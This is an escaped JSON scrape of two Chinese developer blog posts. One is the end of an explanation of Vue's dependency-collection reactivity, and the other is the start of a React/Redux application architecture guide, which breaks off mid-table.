src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc826af0c5bd33?w=459\u0026amp;h=209\u0026amp;f=png\u0026amp;s=12936\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e输入数据\u003c/li\u003e\n\u003cli\u003e改造数据（\u003ccode\u003edefineReactive()\u003c/code\u003e）\u003c/li\u003e\n\u003cli\u003e如果数据变动 =\u0026gt; 触发事件\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e我们来看第三步，数据变动如何触发之后的事件呢？仔细思考一下，如果要改变数据，那么必须先\u003ccode\u003eset\u003c/code\u003e数据，那么我们直接\u003ccode\u003eset()\u003c/code\u003e里面添加方法就ok了呀。\u003c/p\u003e\n\u003cp\u003e然后还有一个重要问题：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc82db9bbbf6e0?w=475\u0026amp;h=219\u0026amp;f=png\u0026amp;s=14193\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e依赖收集\u003c/h3\u003e\u003cp\u003e我们怎么知道数据改变之后要触发的是什么事件呢？在Vue中：\u003c/p\u003e\n\u003cp\u003e使用数据 =\u0026gt; 视图； 使用了数据来渲染视图，那么在获取数据的时候收集依赖是最佳的时机，Vue在改造数据属性的时候生成一个\u003ccode\u003eDep\u003c/code\u003e实例，用于收集依赖。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 代码 1.2\u003c/span\u003e\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eDep\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(){\n        \u003cspan class=\"hljs-comment\"\u003e//订阅的信息\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs = [];\n    }\n\n    addSub(sub){\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs.push(sub);\n    }\n\n    removeSub (sub) {\n        remove(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs, sub);\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e//此方法的作用等同于 this.subs.push(Watcher);\u003c/span\u003e\n    depend(){\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n            Dep.target.addDep(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n        }\n    }\n    \u003cspan class=\"hljs-comment\"\u003e//这个方法就是发布通知了 告诉你 有改变啦\u003c/span\u003e\n    notify(){\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e subs = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs.slice()\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, l = subs.length; i \u0026lt; l; i++) {\n          subs[i].update();\n        }\n    }\n}\nDep.target = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码1.2就是\u003ccode\u003eDep\u003c/code\u003e的部分代码，暂时只需要知道2个方法的作用就可以了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003edepend()\u003c/code\u003e --- 可以理解为收集依赖的事件，不考虑其他方面的话 功能等同于\u003ccode\u003eaddSub()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003enotify()\u003c/code\u003e --- 这个方法更为直观了，执行所有依赖的\u003ccode\u003eupdate()\u003c/code\u003e方法。就是之后的改变视图啊 等等。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本篇主要讨论数据响应的过程，不深入讨论 \u003ccode\u003eWatcher\u003c/code\u003e类，所以\u003ccode\u003eDep\u003c/code\u003e中的方法知道作用就可以了。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e然后就是改变代码1.1了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//代码 1.3\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edefineReactive\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eobj,key,val\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e dep = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Dep();\n\n    \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.defineProperty(obj,key,{\n        \u003cspan class=\"hljs-attr\"\u003eenumerable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003econfigurable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eget\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(Dep.target){\n                \u003cspan class=\"hljs-comment\"\u003e//收集依赖 等同于  dep.addSub(Dep.target)\u003c/span\u003e\n                dep.depend()\n            }\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e val;\n        },\n        \u003cspan class=\"hljs-attr\"\u003eset\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003enewVal\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(newVal === val || (newVal !== newVal \u0026amp;\u0026amp; val !== val)){\n                \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ;\n            }\n            val = newVal;\n            \u003cspan class=\"hljs-comment\"\u003e//发布改变\u003c/span\u003e\n            dep.notify();\n        }\n    });\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这代码中有一个疑点，\u003ccode\u003eDep.target\u003c/code\u003e是什么？为什么要有\u003ccode\u003eDep.target\u003c/code\u003e才会收集依赖呢？\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eDep\u003c/code\u003e是一个类，\u003ccode\u003eDep.target\u003c/code\u003e是类的属性，并不是\u003ccode\u003edep\u003c/code\u003e实例的属性。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eDep\u003c/code\u003e类在全局可用，所以\u003ccode\u003eDep.target\u003c/code\u003e在全局能访问到，可以任意改变它的值。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eget\u003c/code\u003e这个方法使用很平常，不可能每次使用获取数据值的时候都去调用\u003ccode\u003edep.depend()\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edep.depend()\u003c/code\u003e实际上就是\u003ccode\u003edep.addSub(Dep.target)\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e那么最好方法就是，在使用之前把\u003ccode\u003eDep.target\u003c/code\u003e设置成某个对象，在订阅完成之后设置\u003ccode\u003eDep.target = null\u003c/code\u003e。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e验证\u003c/h3\u003e\u003cp\u003e是时候来验证一波代码的可用性了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//代码 1.4\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e obj = {};\u003cspan class=\"hljs-comment\"\u003e//这一句是不是感觉很熟悉  就相当于初始化vue的data ---- data:{obj:{}};\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e//低配的不能再低配的watcher对象（源码中是一个类，我这用一个对象代替了）\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e watcher = {\n    \u003cspan class=\"hljs-attr\"\u003eaddDep\u003c/span\u003e:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003edep\u003c/span\u003e) \u003c/span\u003e{\n        dep.addSub(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n    },\n    \u003cspan class=\"hljs-attr\"\u003eupdate\u003c/span\u003e:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        html();\n    }\n}\n\u003cspan class=\"hljs-comment\"\u003e//假装这个是渲染页面的\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ehtml\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e).innerHTML = obj.html;\n}\ndefineReactive(obj,\u003cspan class=\"hljs-string\"\u003e'html'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'how are you'\u003c/span\u003e);\u003cspan class=\"hljs-comment\"\u003e//定义响应式的数据\u003c/span\u003e\n\nDep.target = watcher;\nhtml();\u003cspan class=\"hljs-comment\"\u003e//第一次渲染界面\u003c/span\u003e\nDep.target = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时浏览器上的界面是这样的\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc8db39f6f7623?w=475\u0026amp;h=147\u0026amp;f=png\u0026amp;s=2751\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e然后在下打开了控制台开始调试，输入：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eobj.html = \u003cspan class=\"hljs-string\"\u003e'I am fine thank you'\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后就发现，按下回车的那一瞬间，奇迹发生了，页面变成了\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc8e41ec10317f?w=250\u0026amp;h=75\u0026amp;f=png\u0026amp;s=1948\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e结尾\u003c/h3\u003e\u003cp\u003eVue数据响应的设计模式和订阅发布模式有一点像，但是不同，每一个\u003ccode\u003edep\u003c/code\u003e实例就是一个订阅中心，每一次发布都会把所有的订阅全部发布出去。\u003cbr\u003eVue的响应式原理其实还有很大一部分，本文主要讨论了Vue是如何让数据进行响应，但是实际上，一般的数据都是很多的，一个数据被多处使用，改变数据之后观察新值，如何观察、如何订阅、如何调度，都还有很大一部分没有讨论。主要的三个类\u003ccode\u003eDep\u003c/code\u003e（收集依赖）、\u003ccode\u003eObserver\u003c/code\u003e（观察数据）、\u003ccode\u003eWatcher\u003c/code\u003e（订阅者，若数据有变化通知订阅者），都只提了一点点。\u003c/p\u003e\n\u003cp\u003e之前写有一篇\u003ca href=\"https://juejin.im/post/5a04231af265da431f4a84be\"\u003eVue响应式----数组变异方法\u003c/a\u003e，针对Vue中对数组的改造进行讨论。当然之后有更多其他的文章，整个数据响应流程还有很多内容，三个主要的类都还没有讨论完。\u003c/p\u003e\n\u003cp\u003e其实阅读源码不仅仅是为了知道源码是如何工作的，更重要的是学习作者的思路与方法，我写的文章都不长，希望自己能够每次专注一个点，能够真真实实领悟到这一个点的原理。当然也想控制阅读时间，免得大家看到一半就关闭了。\u003c/p\u003e\n","buildTime":"1514542976.7165","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f47"},"id":"5a46f14f6fb9a0451d41cfab","author":{"$oid":"5a4b76d92239bd131cd79f26"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"React应用架构设计指南","meta":{"likeCount":0},"tag":["React.js","架构","Redux"],"comment":[],"shortContent":"在上一篇我们介绍了Webpack自动化构建React应用，我们的本地开发服务器可以较好的支持我们编写React应用，并且支持代码热更新。本节将开始详细分析如何搭建一个React应用架构。 现在已经有很多脚手架工具，如create-react-app，支持一键创建一个React应…","content":"\u003cp\u003e在上一篇我们介绍了\u003ca target=\"_blank\" href=\"https://github.com/codingplayboy/react-blog/blob/master/docs/initWebpack.md\"\u003eWebpack自动化构建React应用\u003c/a\u003e，我们的本地开发服务器可以较好的支持我们编写React应用，并且支持代码热更新。本节将开始详细分析如何搭建一个React应用架构。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/codingplayboy/react-blog\"\u003e完整项目代码见github\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://blog.codingplayboy.com/2017/12/30/react_app_structure/\"\u003e个人博客\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e现在已经有很多脚手架工具，如\u003ca target=\"_blank\" href=\"https://github.com/facebookincubator/create-react-app\"\u003ecreate-react-app\u003c/a\u003e，支持一键创建一个React应用项目结构，很方便，但是享受方便的同时，也失去了对项目架构及技术栈完整学习的机会，而且通常脚手架创建的应用技术架构并不能完全满足我们的业务需求，需要我们自己修改，完善，所以如果希望对项目架构有更深掌控，最好还是从0到1理解一个项目。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目结构与技术栈\u003c/h2\u003e\n\u003cp\u003e我们这次的实践不准备使用任何脚手架，所以我们需要自己创建每一个文件，引入每一个技术和三方库，最终形成完整的应用，包括我们选择的完整技术栈。\u003c/p\u003e\n\u003cp\u003e第一步，当然是创建目录，我们在上一篇已经弄好，如果你还没有代码，可以从Github获取：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003egit clone https://github.com/codingplayboy/react-blog.git\ncd react-blog\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e生成项目结构如下图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"React项目初始结构\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a51e721f07354?w=1024\u0026amp;h=550\u0026amp;f=png\u0026amp;s=61131\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003esrc\u003c/code\u003e为应用源代码目录；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewebpack\u003c/code\u003e为webpack配置目录；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewebpack.config.js\u003c/code\u003e为webpack配置入口文件；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003epackage.json\u003c/code\u003e为项目依赖管理文件；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eyarn.lock\u003c/code\u003e为项目依赖版本锁文件；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.babelrc\u003c/code\u003e文件，babel的配置文件，使用babel编译React和JavaScript代码；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeslintrc\u003c/code\u003e和\u003ccode\u003eeslintignore\u003c/code\u003e分别为eslint语法检测配置及需要忽略检查的内容或文件；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003epostcss.config.js\u003c/code\u003e为CSS后编译器postcss的配置文件；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eAPI.md\u003c/code\u003e为API文档入口；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocs\u003c/code\u003e为文档目录；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eREADME.md\u003c/code\u003e为项目说明文档；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e接下来的工作主要就是丰富\u003ccode\u003esrc\u003c/code\u003e目录，包括搭建项目架构，开发应用功能，还有自动化，单元测试等，本篇主要关注项目架构的搭建，然后使用技术栈实践开发几个模块。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e技术栈\u003c/h3\u003e\n\u003cp\u003e项目架构搭建很大部分依赖于项目的技术栈，所以先对整个技术栈进行分析，总结：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003ereact和react-dom库是项目前提；\u003c/li\u003e\n\u003cli\u003ereact路由；\u003c/li\u003e\n\u003cli\u003e应用状态管理容器；\u003c/li\u003e\n\u003cli\u003e是否需要Immutable数据；\u003c/li\u003e\n\u003cli\u003e应用状态的持久化；\u003c/li\u003e\n\u003cli\u003e异步任务管理；\u003c/li\u003e\n\u003cli\u003e测试及辅助工具或函数；\u003c/li\u003e\n\u003cli\u003e开发调试工具；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e根据以上划分决定选用以下第三方库和工具构成项目的完整技术栈：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003ereact，react-dom；\u003c/li\u003e\n\u003cli\u003ereact-router管理应用路由；\u003c/li\u003e\n\u003cli\u003eredux作为JavaScript状态容器，react-redux将React应用与redux连接；\u003c/li\u003e\n\u003cli\u003eImmutable.js支持Immutable化状态，redux-immutable使整个redux store状态树Immutable化；\u003c/li\u003e\n\u003cli\u003e使用redux-persist支持redux状态树的持久化，并添加redux-persist-immutable拓展以支持Immutable化状态树的持久化；\u003c/li\u003e\n\u003cli\u003e使用redux-saga管理应用内的异步任务，如网络请求，异步读取本地数据等；\u003c/li\u003e\n\u003cli\u003e使用jest集成应用测试，使用lodash，ramda等可选辅助类，工具类库；\u003c/li\u003e\n\u003cli\u003e可选使用reactotron调试工具\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e针对以上分析，完善后的项目结构如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"React-Redux项目结构\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a51e722216576?w=608\u0026amp;h=292\u0026amp;f=png\u0026amp;s=13120\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开发调试工具\u003c/h2\u003e\n\u003cp\u003eReact应用开发目前已经有诸多调试工具，常用的如redux-devtools，\u003ca target=\"_blank\" href=\"https://github.com/infinitered/reactotron\"\u003eReactron\u003c/a\u003e等。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eredux-devtools\u003c/h3\u003e\n\u003cp\u003eredux-devtools是支持热重载，回放action，自定义UI的一款Redux开发工具。\u003c/p\u003e\n\u003cp\u003e首先需要按照对应的浏览器插件，然后再Redux应用中添加相关配置，就能在浏览器控制台中查看到redux工具栏了，\u003ca target=\"_blank\" href=\"https://github.com/zalmoxisus/redux-devtools-extension#installation\"\u003e详细文档点此查看\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e然后安装项目依赖库：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003eyarn add --dev redux-devtools\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后在创建redux store时将其作为redux强化器传入\u003ccode\u003ecreateStore\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { applyMiddleware, compose, createStore, combineReducers } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'redux'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 默认为redux提供的组合函数\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e composeEnhancers = compose\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (__DEV__) {\n  \u003cspan class=\"hljs-comment\"\u003e// 开发环境，开启redux-devtools\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e composeWithDevToolsExtension = \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e composeWithDevToolsExtension === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e) {\n    \u003cspan class=\"hljs-comment\"\u003e// 支持redux开发工具拓展的组合函数\u003c/span\u003e\n    composeEnhancers = composeWithDevToolsExtension\n  }\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// create store\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = createStore(\n  combineReducers(...),\n  initialState,\n  \u003cspan class=\"hljs-comment\"\u003e// 组合redux中间价和加强器，强化redux\u003c/span\u003e\n  composeEnhancers(\n    applyMiddleware(...middleware),\n    ...enhancers\n  )\n)\n\u003c/code\u003e\u003c/pre\u003e\u003col\u003e\n\u003cli\u003e在开发环境下获取redux-devtools提供的拓展组合函数；\u003c/li\u003e\n\u003cli\u003e创建store时使用拓展组合函数组合redux中间件和增强器，redux-dev-tools便获得了应用redux的相关信息；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003eReactotron\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/infinitered/reactotron\"\u003eReactotron\u003c/a\u003e是一款跨平台调试React及React Native应用的桌面应用，能动态实时监测并输出React应用等redux，action，saga异步请求等信息，如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Reactotron\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a51e78786fe6d?w=981\u0026amp;h=695\u0026amp;f=gif\u0026amp;s=6262780\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e首先安装：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003eyarn add --dev reactotron-react-js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后初始化Reactotron相关配置：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;Reactotron\u0026nbsp;from\u0026nbsp;'reactotron-react-js';\u003cbr\u003eimport\u0026nbsp;{\u0026nbsp;reactotronRedux\u0026nbsp;as\u0026nbsp;reduxPlugin\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'reactotron-redux';\u003cbr\u003eimport\u0026nbsp;sagaPlugin\u0026nbsp;from\u0026nbsp;'reactotron-redux-saga';\u003cbr\u003e\u003cbr\u003eif\u0026nbsp;(Config.useReactotron)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;refer\u0026nbsp;to\u0026nbsp;https://github.com/infinitered/reactotron\u0026nbsp;for\u0026nbsp;more\u0026nbsp;options!\u003cbr\u003e\u0026nbsp;\u0026nbsp;Reactotron\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.configure({\u0026nbsp;name:\u0026nbsp;'React\u0026nbsp;Blog'\u0026nbsp;})\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.use(reduxPlugin({\u0026nbsp;onRestore:\u0026nbsp;Immutable\u0026nbsp;}))\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.use(sagaPlugin())\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;.connect();\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;Let's\u0026nbsp;clear\u0026nbsp;Reactotron\u0026nbsp;on\u0026nbsp;every\u0026nbsp;time\u0026nbsp;we\u0026nbsp;load\u0026nbsp;the\u0026nbsp;app\u003cbr\u003e\u0026nbsp;\u0026nbsp;Reactotron.clear();\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;Totally\u0026nbsp;hacky,\u0026nbsp;but\u0026nbsp;this\u0026nbsp;allows\u0026nbsp;you\u0026nbsp;to\u0026nbsp;not\u0026nbsp;both\u0026nbsp;importing\u0026nbsp;reactotron-react-js\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;on\u0026nbsp;every\u0026nbsp;file.\u0026nbsp;\u0026nbsp;This\u0026nbsp;is\u0026nbsp;just\u0026nbsp;DEV\u0026nbsp;mode,\u0026nbsp;so\u0026nbsp;no\u0026nbsp;big\u0026nbsp;deal.\u003cbr\u003e\u0026nbsp;\u0026nbsp;console.tron\u0026nbsp;=\u0026nbsp;Reactotron;\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后启使用\u003ccode\u003econsole.tron.overlay\u003c/code\u003e方法拓展入口组件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;'./config/ReactotronConfig';\u003cbr\u003eimport\u0026nbsp;DebugConfig\u0026nbsp;from\u0026nbsp;'./config/DebugConfig';\u003cbr\u003e\u003cbr\u003eclass\u0026nbsp;App\u0026nbsp;extends\u0026nbsp;Component\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;render\u0026nbsp;()\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Provider\u0026nbsp;store={store}\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;AppContainer\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/Provider\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;)\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e}\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;allow\u0026nbsp;reactotron\u0026nbsp;overlay\u0026nbsp;for\u0026nbsp;fast\u0026nbsp;design\u0026nbsp;in\u0026nbsp;dev\u0026nbsp;mode\u003cbr\u003eexport\u0026nbsp;default\u0026nbsp;DebugConfig.useReactotron\u003cbr\u003e\u0026nbsp;\u0026nbsp;?\u0026nbsp;console.tron.overlay(App)\u003cbr\u003e\u0026nbsp;\u0026nbsp;:\u0026nbsp;App\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e至此就可以使用Reactotron客户端捕获应用中发起的所有的redux和action了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e组件划分\u003c/h2\u003e\n\u003cp\u003eReact组件化开发原则是组件负责渲染UI，组件不同状态对应不同UI，通常遵循以下组件设计思路：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e布局组件：仅仅涉及应用UI界面结构的组件，不涉及任何业务逻辑，数据请求及操作；\u003c/li\u003e\n\u003cli\u003e容器组件：负责获取数据，处理业务逻辑，通常在render()函数内返回展示型组件；\u003c/li\u003e\n\u003cli\u003e展示型组件：负责应用的界面UI展示；\u003c/li\u003e\n\u003cli\u003eUI组件：指抽象出的可重用的UI独立组件，通常是无状态组件；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003e展示型组件\u003c/th\u003e\n\u003cth\u003e容器组件\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e目标\u003c/td\u003e\n\u003ctd\u003eUI展示 